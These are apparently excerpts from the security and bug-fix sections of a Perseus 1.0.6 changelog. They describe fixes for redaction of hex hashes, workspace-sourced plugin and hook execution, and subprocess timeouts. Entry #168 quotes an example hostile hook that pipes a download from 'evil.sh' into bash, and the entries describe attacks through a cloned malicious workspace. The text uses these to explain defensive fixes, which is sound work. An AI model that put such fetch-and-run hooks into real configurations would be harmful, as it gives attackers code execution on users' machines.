21|21|21|### 🔒 Security
22|22|22|
23|23|23|- **#136** — `long_hex_secret` default redaction rule rewritten. The pre-1.0.6
24|24|24|  rule (`\b[a-fA-F0-9]{40,}\b`) silently destroyed git commit hashes (40 hex),
25|25|25|  SHA-256 checksums (64 hex), Docker digests, and Atlassian content hashes in
26|26|26|  `@query`, `@waypoint`, and `@perseus` output. The rule now requires an
27|27|27|  explicit credential anchor (`secret=`, `token:`, `api_key=`, `Authorization=`,
28|28|28|  etc.) before redacting hex strings. Real secrets in credential context are
29|29|29|  still caught; bare hashes survive verbatim. New regression tests in
30|30|30|  `tests/test_redaction.py`.
31|31|31|- Internal: redaction rules now support an optional `_anchor_group` field that
32|32|32|  identifies which capture group holds the secret payload (everything outside
33|33|33|  the group is preserved). Used by `long_hex_secret`; available for future
34|34|34|  context-aware rules.

39|39|39|  config setting both `permissions.profile: balanced` and

54|54|54|### 🔒 Security
55|55|55|
56|56|56|- **#169** — Workspace-sourced plugin configuration (`plugins.dir`) is
57|57|57|  now refused by default. Pre-1.0.6 a workspace `.perseus/config.yaml`
58|58|58|  setting `plugins.dir: /path/to/attacker/code` caused
59|59|59|  `_discover_plugins()` to `spec.loader.exec_module(mod)` on every
60|60|60|  `.py` file in that directory at startup — full Python execution
61|61|61|  before any directive trust gate, audit, or user prompt. Same attack
62|62|62|  vector as #168 but with no shell-quoting limits. Attack: git clone a
63|63|63|  malicious workspace, get pwned.
64|64|64|
65|65|65|  Fix: `_discover_plugins` consults
66|66|66|  `cfg["_provenance"]["plugins_workspace_sourced"]` set by
67|67|67|  `load_config`. Workspace-sourced plugin config is refused unless BOTH:
68|68|68|  1. Global `~/.perseus/config.yaml` sets `plugins.allow_workspace_sourced: true`
69|69|69|  2. Env var `PERSEUS_ALLOW_DANGEROUS=1`
70|70|70|
71|71|71|  Refusal emits a `plugins_workspace_refused` audit event with the
72|72|72|  refused directory path. Global-sourced plugin config is unaffected.
73|73|73|
74|74|74|  Regression suite (8 tests): workspace plugin dir refused by default,
75|75|75|  allowed with full opt-in, refused with only-global, refused with
76|76|76|  only-env, global plugins always load, audit trail, no false-positive
77|77|77|  refusal when no plugin config exists, allow-gate helper unit test.
78|78|78|
79|79|79|- **#168** — Workspace-sourced shell hooks and Python `hooks.dir` are
80|80|80|  now refused by default. Pre-1.0.6 a workspace `.perseus/config.yaml`
81|81|81|  could declare `hooks.on_render_start: ["curl evil.sh | bash"]` and
82|82|82|  the command would run on the next `perseus render` — no
83|83|83|  `allow_query_shell`, no `PERSEUS_ALLOW_DANGEROUS`, no audit. Same
84|84|84|  attack via `hooks.dir: /path/to/attacker/code` (Python top-level
85|85|85|  code runs at import time). Attack: git clone a malicious workspace,
86|86|86|  get pwned.
87|87|87|
88|88|88|  Fix: `load_config` annotates `cfg["_provenance"]` with which
89|89|89|  sections came from the workspace source. `hooks.py` refuses
90|90|90|  workspace-sourced shell hooks and `hooks.dir` Python hooks unless
91|91|91|  BOTH conditions are met:
92|92|92|  1. Global `~/.perseus/config.yaml` sets `hooks.allow_workspace_sourced: true`
93|93|93|  2. Env var `PERSEUS_ALLOW_DANGEROUS=1` is set
94|94|94|

97|97|97|  unaffected (the user owns global config; trust is implicit).

100|100|100|  with full opt-in, refused with only-global opt-in, refused with
101|101|101|  only-env opt-in, global hooks always run, provenance tracking, audit
102|102|102|  trail, Python hooks.dir refused.

107|107|108|### 🔒 Security Hardening
108|108|109|
109|109|110|- **#129** — Trust profile / user config layering is now **structurally**
110|110|111|  guaranteed to honor explicit user overrides, regardless of the textual
111|111|112|  order in which `_apply_permission_profile` and the user-merge run.
112|112|113|
113|113|114|  **Problem (pre-v1.0.6):** the layering precedence rule "user config wins
114|114|115|  over profile defaults" was correct *as documented* (see `task-45 AC #3`)
115|115|116|  but depended entirely on `load_config` calling `_apply_permission_profile`
116|116|117|  BEFORE the user-merge step. Any future refactor that reordered these two
117|117|118|  calls — or a third caller that invoked the profile-apply directly without
118|118|119|  knowing the convention — would silently revert a user who set
119|119|120|  `permissions.profile: balanced` AND `render.allow_query_shell: true` to
120|120|121|  `allow_query_shell=false`. This is exactly the scenario filed in #129
121|121|122|  ("balanced profile silently disables `@query` despite explicit override").
122|122|123|
123|123|124|  **Fix:**
124|124|125|  1. `load_config` now pre-scans all sources to collect every
125|125|126|     `(section, key)` the user has explicitly set, then passes that set
126|126|127|     to `_apply_permission_profile(..., skip_keys=...)` as the new
127|127|128|     keyword arg.
128|128|129|  2. `_apply_permission_profile` skips any key in `skip_keys`,
129|129|130|     structurally guaranteeing that user values win. The legacy
130|130|131|     no-skip-keys signature is preserved for backward compatibility.
131|131|132|  3. `load_config` emits a `config_profile_overridden` audit event
132|132|133|     enumerating which user-set keys won out over the profile. This
133|133|134|     makes the layering decision observable and debuggable.
134|134|135|
135|135|136|  **Regression test matrix:** 30 parametrized tests covering all 3
136|136|137|  profiles × all 5 boolean security gates × both override directions,
137|137|138|  plus 6 explicit tests for direct unit behavior, workspace>global
138|138|139|  precedence, audit-event observability, and no-noise audit events
139|139|140|  when only non-profile-managed keys are set.
140|140|141|
141|141|142|  No config breaking changes. Behavior is strictly safer.

429|430|### 🐛 Bug Fixes
430|431|
431|432|- **#131** — `perseus memory compact` no longer hangs indefinitely when an
432|433|  LLM provider (e.g. Ollama with a large model) is slow. Pre-1.0.6,
433|434|  `_mneme_compact_llm()` called `run_llm()` which only enforced
434|435|  `llm.timeout_s` (default 30s) on the HTTP request itself. With streaming
435|436|  token providers, individual tokens can arrive within timeout but total
436|437|  wall time was unbounded — operators reported `memory compact` hanging
437|438|  for hours.
438|439|  - `_memory_do_compact()` now wraps the LLM call in a wall-clock deadline
439|440|    via `ThreadPoolExecutor.future.result(timeout=…)`.
440|441|  - New config knob `memory.compact_total_timeout_s` (default 180s).
441|442|    Set to 0 for pre-1.0.6 behavior (unbounded; not recommended).
442|443|  - On timeout, `_memory_do_compact` falls back to the deterministic
443|444|    narrative builder and writes a clear stderr message:
444|445|    `> ⚠ Mnēmē compact: LLM provider 'ollama' exceeded
445|446|    compact_total_timeout_s=180s; falling back to deterministic narrative.`
446|447|  - New audit event `memory_compact_timeout` records provider, timeout
447|448|    value, and workspace hash for observability.
448|449|  - Same fallback path engages on any LLM exception (provider unreachable,
449|450|    payload error) — `memory compact` always produces a usable narrative.
450|451|  - **Limitation:** ThreadPoolExecutor cannot truly kill the worker
451|452|    thread; the in-flight HTTP request continues until urllib's
452|453|    per-request timeout fires. Worst-case wait is therefore
453|454|    `compact_total_timeout_s + llm.timeout_s`. The leaked thread is
454|455|    daemonized and will not block process exit.

714|  and no longer blocks on executor shutdown. Pre-1.0.6 had two coupled
715|  bugs:
716|  1. `future.result(timeout=…)` only abandoned the future — the worker
717|     thread (and any subprocess it had spawned) kept running, leaking
718|     CPU + side effects.
719|  2. The wrapper was a `with concurrent.futures.ThreadPoolExecutor(...)`
720|     block, so `executor.shutdown(wait=True)` ran on exit — blocking the
721|     MCP response until the abandoned worker finished. A 5s timeout on
722|     `sleep 600` blocked the MCP response for ~600s.
723|
724|  Fix:
725|  - `_call_tool()` now uses a non-context-managed executor and calls
726|    `shutdown(wait=False, cancel_futures=True)` in a `finally` block.
727|    Response returns within ~timeout seconds, not ~sleep seconds.
728|  - `directives/query.py::resolve_query` now launches its subprocess
729|    with `start_new_session=True` (POSIX) so the child gets its own
730|    process group, and registers the popen handle in a module-level
731|    thread-keyed dict.
732|  - On timeout, `_call_tool` looks up the worker thread's subprocess
733|    and calls a new `kill_active_subprocess_for_thread(tid)` which
734|    `os.killpg(pgid, SIGTERM)` (then `SIGKILL` if needed) on POSIX, or
735|    `taskkill /F /T /PID` on Windows. The entire subprocess tree is
736|    taken down atomically.
737|  - Timeout response surfaces the kill with a `" (subprocess killed)"`
738|    suffix so operators can see the kill actually fired.
